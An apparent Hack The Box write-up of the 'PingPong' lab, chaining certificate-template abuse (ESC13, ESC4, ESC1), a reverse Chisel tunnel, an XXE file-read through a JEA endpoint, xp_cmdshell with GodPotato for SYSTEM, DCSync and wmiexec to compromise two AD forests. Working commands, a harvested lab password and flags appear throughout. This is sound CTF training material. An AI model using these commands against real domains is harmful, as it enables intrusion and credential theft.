# PingPong HTB: 12 days of debugging for 3 days of actual path

PingPong, Hack The Box. Insane difficulty. Multi-forest Active Directory, bidirectional trust between PING and PONG. One starting account: `c.roberts`, Domain User on PING, password `AssumedBreach123`.

Thirty-one sessions later, I had both flags. In between: a Chisel tunnel that took 3 days to stabilize, a SID parser that had been lying since day one, an MSSQL server that said "untrusted domain" thirteen times before we understood why, and an inter-realm golden ticket that should have worked but got eaten by Server 2022.

If you're here for the technical summary: ESC13 to gMSA Managers WriteDACL to XXE via JEA to PSReadLine to c.carlssen's password to DCSync on PONG to ESC4 to ESC1 to root.txt. The rest of this is how we got there.

---

## Step 1: c.roberts and the TemporaryWinRM template

BloodHound shows c.roberts is in TempWinRMAccess. This group has enrollment rights on the TemporaryWinRM certificate template. Classic ESC13.

```bash
certipy req -u c.roberts@ping.htb -p AssumedBreach123 \
  -ca ping-dc1-ca -template TemporaryWinRM -dc-ip 10.129.245.56

certipy auth -pfx c.roberts.pfx -dc-ip 10.129.245.56
```

TGT with TempWinRMAccess SID in hand. pypsrp to DC1, whoami = ping\c.roberts. First step done in 20 minutes. The last one would take 300 times longer.

---

## Step 2: the tunnel that broke us

To talk to PONG (the second forest), we need a tunnel from DC1 into the 192.168.2.0/24 LAN. Tool of choice: Chisel.

Three days.

The Windows chisel 1.11.5 client refuses to connect to the 1.10.1 server. Stream error. Version match 1.11.5 on both sides? The Windows client crashes the moment pypsrp closes the session. SSH reverse tunnel? Job Object kills the process. pf NAT on Mac? The nat/binat rules evaluate zero packets. Wine amd64 in Docker to test the Windows binary? It's PE32+, not ELF, and the ARM64 container via Rosetta can't run it.

Solution found on day 3:

```
Mac:       chisel 1.11.5 server --reverse --port 8890
DC1:       chiselw.exe client 10.10.14.210:8890 R:40888:192.168.2.2:88 R:40389:192.168.2.2:389
Container: socat 127.0.0.1:88 → Mac:40888   (PONG KDC)
Container: socat 127.0.0.1:389 → Mac:40389  (PONG LDAP)
```

Start-Sleep 3600 in the pypsrp script to keep the chisel process alive when the session ends. Ugly but it works.

If I take one thing from those 3 days: verify exact binary versions before spending 6 hours debugging the network.

---

## Step 3: the phantom SID and the DACL we misread

Cross-realm LDAP to PONG works. We enumerate. The gMSA Managers group (PONG) can read the password of the gMSA account `Pong_gMSA$`. Except the group is empty, scope Global, and everyone tells us "insufficientAccessRights" when we try to write.

We read the LDAP attributes: c.roberts has GenericAll on the group. Yet bloodyAD rejects every modification.

The bug was in our BloodHound parsing script. It generated a completely wrong SID due to incorrect binary parsing of the binary SID field.

```
SID used (wrong):    S-1-5-21-735101288-...
Actual c.roberts:    S-1-5-21-750635624-2058721901-1932338391-2617
```

Three days trying to write with a SID that doesn't exist.

Second problem: bloodyAD sets its ACEs with OICI flags (0x3), which apply to child objects only, not the container itself. So even with the correct SID, the ACE was useless on the group object. Solution: GSSAPI + ldap3 + AceFlags=0 directly, bypassing bloodyAD.

GroupType flip Global to Domain Local. c.roberts added as Foreign Security Principal. The msDS-ManagedPassword blob of Pong_gMSA$ becomes readable.

Second lesson: never trust a homegrown SID parser without verifying against a proven tool.

---

## Step 4: the gMSA blob that wouldn't give up its keys

Blob is 548 bytes. MSDS_MANAGEDPASSWORD_BLOB structure. NT hash is easy to extract (MD4 of the password string). But to generate a TGT, we need the AES keys.

Two sessions deriving PBKDF2 manually with different salts: PONG.HTBPong_gMSA$, PONG.HTBpong_gmsa, pong.htbPong_gMSA$, etc. None work against the PONG KDC. KDC_ERR_PREAUTH_FAILED every time.

The solution came from nxc:

```bash
nxc ldap dc2.pong.htb -d ping.htb -u c.roberts -k --use-kcache --gmsa
→ AES256: 25f723bf67708cad8ae181e861d59c3e3407e0c4c079f25673481c5f169a6561
```

bloodyAD only returns the PasswordString from the blob. nxc reads the raw LDAP attribute and parses the full GMSA_CREDENTIAL structure. The AES keys are stored directly in it, not derived from the password. PBKDF2 was pointless from the start.

Bonus: the password string contains UTF-16LE surrogates that crash impacket. Three-line patch in crypto.py: `string.encode("utf-8", errors="surrogatepass")`.

---

## Step 5: the JEA we thought was dead

Pong_gMSA$ connects to the `restricted` JEA endpoint on DC1. RestrictedRemoteServer, ConstrainedLanguage. 8 cmdlets: Clear-Host, Exit-PSSession, Get-Command, Get-FormatData, Get-Help, Measure-Object, Out-Default, Select-Object. No FileSystem provider, no .NET via New-Object, no Out-File.

Full analysis of the XML definitions. No custom business functions. Apparent dead end.

But I forgot one detail: `[System.Xml.XmlDocument]::new()` is not `New-Object`. The first is a static .NET constructor, the second is a PowerShell cmdlet blocked by JEA. ConstrainedLanguage does not block static calls to .NET classes.

```powershell
$x = [System.Xml.XmlDocument]::new()
$dtd = "<!ENTITY x SYSTEM 'file:///C:/Users/Pong_gMSA$/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt'>"
$xml = "<?xml version='1.0'?><!DOCTYPE foo [$dtd]><root>&x;</root>"
$x.LoadXml($xml)
```

XXE via DTD external entity. Pong_gMSA$'s PSReadLine file contains 43 history commands. Among them:

```
$c = New-object System.management.automation.pscredential("pong\c.carlssen",
  $(convertto-securestring -asplaintext -force "A()DUJ!@414"))
Enter-pssession -computername dc2.pong.htb -credential $c
```

An admin used the gMSA account to test the connection to DC2, and c.carlssen's password stayed in the PowerShell history.

Third lesson: check PSReadLine history every single time, especially on service accounts.

---

## Step 6: user.txt, finally

c.carlssen@PONG is in Remote Management Users and IT Service Admins. Double-hop WinRM:

```
DC1 (c.roberts@PING) → Enter-PSSession dc2.pong.htb (c.carlssen@PONG)
→ C:\Users\C.Carlssen\Desktop\user.txt
```

Flag: `06f75e8838b1b64deddb6c6979683a35`

---

## Step 7: the 13 "untrusted domain" attempts

For root.txt we need Administrator@PING. The path goes through PONG: SYSTEM on DC2, DCSync, ExtraSids toward PING.

c.carlssen has WriteProperty on svc_sql (the MSSQL service account). We configure RBCD: Pong_gMSA$ can impersonate toward svc_sql. S4U2Proxy gets an MSSQL ticket for c.adam, who is sysadmin.

```
mssqlclient.py -k c.adam@dc2.pong.htb
→ Login from an untrusted domain
```

Thirteen attempts later, same error every time. We tested:

- The ccache filename. c.adam@MSSQLSvc_dc2.pong.htb:1433@PONG.HTB.ccache contains `:`, which Kerberos interprets as TYPE:path. Cache invisible.
- The exact SPN. MSSQLSvc/dc2.pong.htb:1433 with the port, not without.
- The clock skew. 8 hours offset between the container UTC and PONG time. Patched timedelta in getST.py AND kerberosv5.py (both files, otherwise TGS-REQ and AP-REQ are desynchronized).
- NTLM disabled on PONG, tested anyway.
- SOCKS vs direct tunnel.
- c.adam, svc_sql, c.carlssen, Administrator.

With -debug we confirm the ticket arrives at the MSSQL server. The server rejects it, not the network.

What finally worked: kvno (native MIT Kerberos). The patched getST.py generated a structurally different ticket from what kvno produces. The KDC accepted both, MSSQL only accepted one.

```bash
kvno MSSQLSvc/dc2.pong.htb:1433
mssqlclient.py -k dc2.pong.htb
→ pong\c.adam (sysadmin=1)
```

Fourth lesson: a `:` in the ccache filename and Kerberos sees a nonexistent cache type. Two hours debugging a ticket that was never loaded.

---

## Step 8: MSSQL to SYSTEM

```sql
sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
xp_cmdshell 'whoami';
→ pong\svc_sql
```

We need to upload GodPotato.exe. DC2 has no direct route to the Mac. DC1 has no HTTP listener. Solution: split the binary into 11 base64 chunks of 7000 characters, echo them one by one to DC2, concatenate, certutil -decode.

```powershell
echo.LIGNE1>>$env:TEMP\gp.b64
# repeat 11 times
certutil -decode $env:TEMP\gp.b64 $env:TEMP\GodPotato.exe
GodPotato -cmd "cmd /c whoami"
→ nt authority\system
```

With SYSTEM, c.carlssen becomes Domain Admin on PONG. Volume Shadow Copy extracts ntds.dit and SYSTEM.hive.

---

## Step 9: the golden ticket that was worth nothing

krbtgt PONG hash extracted, AES keys in hand. We forge an inter-realm golden ticket with ExtraSids for Domain Admins on PING. Four attempts, four failures.

The KDC is a Server 2022 with PAC validation. The golden ticket's PAC is signed with krbtgt PONG, but the PING KDC verifies the cross-realm signature. Without the trust account key for PING$ in PONG, the signature is invalid.

Fifth lesson: inter-realm golden tickets don't pass on Server 2022+ without the trust key. The most realistic lab I've seen on this mechanism.

---

## Step 10: ESC4 to ESC1 to endgame

The DCSync also pulled R.Martinelli. Foreign Security Principal on PONG, CA Manager on the PING PKI.

We grant GenericAll to c.roberts on the SmartcardAuthentication template (ESC4). We configure the template to allow UPN in the SAN (ESC1). We enroll a certificate with UPN=administrator@ping.htb.

```bash
certipy req -u c.roberts@ping.htb -p AssumedBreach123 \
  -template SmartcardAuthentication -ca ping-dc1-ca \
  -upn administrator@ping.htb

certipy auth -pfx administrator.pfx -dc-ip 10.129.245.56
→ TGT Administrator@PING

nxc smb dc1.ping.htb -k --use-kcache
→ Pwn3d!
```

---

## root.txt

```bash
wmiexec.py -k -no-pass dc1.ping.htb
C:\> type C:\Users\Administrator\Desktop\root.txt
2723de5720139aca8e2b4ff2cbd9af01
```

---

## The real timeline

| Day | What happened |
|-----|---------------|
| 1 | ESC13 was easy. Then 3 days on Chisel. |
| 4 | Kerberos 3-step OK, PONG tunnel finally UP |
| 5-7 | WriteDACL gMSA Managers. SID bug + OICI flags. |
| 8 | gMSA blob read. AES256 refuses to work. We derive PBKDF2 into the void. |
| 9 | JEA analyzed thoroughly. 8 cmdlets. Nothing. Dead end. |
| 10 | XXE via XmlDocument::new(). PSReadLine history spills everything. |
| 11 | user.txt |
| 12-14 | MSSQL "untrusted domain" x 13. |
| 15 | kvno direct. Connected in 1 command. |
| 16 | GodPotato, SYSTEM, DCSync |
| 17 | Inter-realm golden ticket blocked |
| 18 | ESC4 to ESC1 to PKINIT to root.txt |

3 days of clear path. 12 days of broken tunnels, bogus SIDs, pointless PBKDF2 derivations, badly named ccache files, and "untrusted domain" on endless repeat.

---

## What I take away from this

1. A homemade SID parser says one thing, a proven tool says another: believe the tool.
2. Chisel 1.10.1 and 1.11.5 binaries don't talk to each other. Version-match both sides, always.
3. The MSDS-MANAGEDPASSWORD blob returned by bloodyAD is not the complete GMSA_CREDENTIAL structure. The AES keys live in the full structure, not derivable from the PasswordString.
4. `[Class]::new()` passes under ConstrainedLanguage. `New-Object` doesn't. JEA is less watertight than it looks.
5. PSReadLine history on service accounts: the mother of all credential leaks.
6. No `:` and no `@` in ccache filenames.
7. kvno (native MIT Kerberos) and getST.py (impacket) don't produce the same ticket. Sometimes the KDC accepts both, sometimes the application service only wants one.
8. Inter-realm golden ticket + Server 2022 = dead without the trust account key.

---

## Tools

BloodHound, Certipy, NetExec (nxc), Impacket, bloodyAD, Chisel, GodPotato, pypsrp, PowerShell, DeepSeek

---

*PingPong HTB, June 2026. GoodcatSlivin.*
